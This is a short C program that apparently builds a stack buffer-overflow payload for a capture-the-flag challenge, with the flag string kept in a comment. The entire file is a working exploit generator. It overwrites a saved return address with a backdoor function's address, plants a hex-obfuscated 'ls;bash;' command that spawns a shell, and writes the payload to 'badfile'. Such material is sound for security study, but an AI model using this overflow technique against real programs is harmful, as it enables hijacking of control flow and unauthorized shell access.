#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUF_SIZE 100    // too long may overwrite other code, 1024 does not work
#define uint unsigned int

// const char code[] = "ls;bash;";
const char code[] = "\x6c\x73\x3b\x62\x61\x73\x68\x3b";
// cat flag.txt
// flag{U5ELE55_W15d0M_1z_d0U8LE_ph00L15HNEez}

// local address, address will change
uint bdoor_addr = 0x565c063d;
uint buf_addr = 0xffafa450;

int main(){
    char buf[BUF_SIZE];
    FILE *badfile;

    printf("Stack overflow volnerability starting up...\n");
    
    scanf("%x %x", &bdoor_addr, &buf_addr); // address will change 
    memset(buf, 'x', sizeof(buf)); // fill unless char
    *((uint *)(&buf[44])) = bdoor_addr; // backdoor function
    *((uint *)(&buf[52])) = buf_addr + 68;  // buf address
    memcpy(&buf[68], code, strlen(code)); // ls;
    buf[BUF_SIZE-1] = '\0'; // end
    printf("%s\n", buf);

    badfile = fopen("badfile", "wb");
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
    
    printf("Stack overflow function returned\n");
}
